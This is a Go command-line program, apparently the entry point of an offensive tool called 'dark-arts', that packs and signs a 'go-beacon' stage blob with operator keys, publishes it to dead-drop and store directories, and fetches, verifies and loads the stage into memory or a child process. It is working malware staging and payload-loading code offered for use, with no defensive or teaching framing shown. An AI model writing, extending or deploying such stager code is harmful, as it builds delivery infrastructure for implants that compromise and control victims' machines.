package main

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"os"
	"strings"

	"dark-arts/internal/version"
	"dark-arts/pkg/crypto"
	"dark-arts/pkg/deaddrop"
	"dark-arts/pkg/logging"
	"dark-arts/pkg/stager"
	"dark-arts/pkg/store"
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "pack" {
		os.Exit(runPack(os.Args[2:]))
	}
	if len(os.Args) >= 2 && os.Args[1] == "fetch" {
		os.Exit(runFetch(os.Args[2:]))
	}
	os.Exit(runFetch(os.Args[1:]))
}

func runPack(args []string) int {
	fs := flag.NewFlagSet("pack", flag.ExitOnError)
	blobPath := fs.String("blob", "", "path to the stage blob")
	keySeed := fs.String("key", "", "operator seed (hex, 64 chars); generates one if empty")
	manifestOut := fs.String("manifest-out", "", "write manifest JSON to this path")
	ddDir := fs.String("dd-dir", "", "publish to file dead-drop dir")
	storeDir := fs.String("store-dir", "", "publish blob to file store dir")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	if *blobPath == "" {
		fmt.Fprintln(os.Stderr, "pack: -blob is required")
		return 2
	}
	blob, err := os.ReadFile(*blobPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "pack: read blob: %v\n", err)
		return 1
	}

	var op *crypto.OperatorKeys
	if *keySeed != "" {
		seed, err := hex.DecodeString(*keySeed)
		if err != nil {
			fmt.Fprintf(os.Stderr, "pack: bad seed: %v\n", err)
			return 2
		}
		op, err = crypto.OperatorKeysFromSeed(seed)
		if err != nil {
			fmt.Fprintf(os.Stderr, "pack: seed: %v\n", err)
			return 2
		}
	} else {
		op, err = crypto.NewOperatorKeys()
		if err != nil {
			fmt.Fprintf(os.Stderr, "pack: keys: %v\n", err)
			return 1
		}
	}

	m, err := stager.SignStage(op, "go-beacon", blob)
	if err != nil {
		fmt.Fprintf(os.Stderr, "pack: sign: %v\n", err)
		return 1
	}

	ctx := context.Background()
	var manifestRef string
	if *ddDir != "" || *storeDir != "" {
		dd := deaddrop.NewFile(*ddDir)
		var st store.Store
		if *storeDir != "" {
			st = store.NewFile(*storeDir)
		}
		manifestRef, err = stager.Publish(ctx, m, blob, dd, st)
		if err != nil {
			fmt.Fprintf(os.Stderr, "pack: publish: %v\n", err)
			return 1
		}
	}

	if *manifestOut != "" {
		b, _ := json.MarshalIndent(m, "", "  ")
		if err := os.WriteFile(*manifestOut, b, 0o600); err != nil {
			fmt.Fprintf(os.Stderr, "pack: write manifest: %v\n", err)
			return 1
		}
	}

	fmt.Printf("operator_pub: %s\n", hex.EncodeToString(op.Public))
	fmt.Printf("blob_ref: %s\n", m.Ref)
	fmt.Printf("blob_size: %d\n", m.Size)
	fmt.Printf("blob_sha256: %s\n", m.SHA256)
	if manifestRef != "" {
		fmt.Printf("manifest_ref: %s\n", manifestRef)
	}
	if *keySeed == "" {
		fmt.Fprintf(os.Stderr, "pack: keep your operator seed (not printed). stager needs -operator-pub above.\n")
	}
	return 0
}

func runFetch(args []string) int {
	fs := flag.NewFlagSet("fetch", flag.ExitOnError)
	ddDir := fs.String("dd-dir", "", "file dead-drop dir")
	storeDir := fs.String("store-dir", "", "file store dir")
	ref := fs.String("ref", "", "manifest dead-drop ref")
	operatorPub := fs.String("operator-pub", os.Getenv("DARK_ARTS_OPERATOR_PUB"), "operator ed25519 public key (hex)")
	loaderMode := fs.String("loader", "memory", "memory | child")
	maxSize := fs.Int64("max-size", 0, "max stage blob size in bytes")
	logLevel := fs.String("log", "", "debug|info|warn|error")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	log := logging.New(*logLevel)
	if *ref == "" {
		fmt.Fprintln(os.Stderr, "fetch: -ref is required")
		return 2
	}
	pub, err := hex.DecodeString(*operatorPub)
	if err != nil || len(pub) == 0 {
		fmt.Fprintln(os.Stderr, "fetch: -operator-pub is required (hex)")
		return 2
	}
	if *ddDir == "" {
		fmt.Fprintln(os.Stderr, "fetch: -dd-dir is required")
		return 2
	}
	dd := deaddrop.NewFile(*ddDir)
	var st store.Store
	if *storeDir != "" {
		st = store.NewFile(*storeDir)
	}

	s, err := stager.New(stager.Options{
		Resolver: dd, Store: st, OperatorPub: pub, MaxSize: *maxSize, Log: log,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "fetch: %v\n", err)
		return 1
	}

	var loader stager.Loader
	switch *loaderMode {
	case "memory":
		loader = &stager.MemoryLoader{}
	case "child":
		loader = &stager.ChildLoader{Stdout: os.Stdout, Stderr: os.Stderr}
	default:
		fmt.Fprintf(os.Stderr, "fetch: unknown loader %q\n", *loaderMode)
		return 2
	}

	log.Info("dark-arts stager starting", "version", version.Version)
	res, err := s.FetchAndLoad(context.Background(), *ref, loader)
	if err != nil {
		if errors.Is(err, deaddrop.ErrNotFound) || strings.Contains(err.Error(), "not found") {
			log.Error("stage unavailable", "err", err)
			return 3
		}
		log.Error("stage rejected", "err", err)
		return 1
	}
	log.Info("stage loaded", "kind", res.Manifest.Kind, "size", len(res.Blob))
	return 0
}
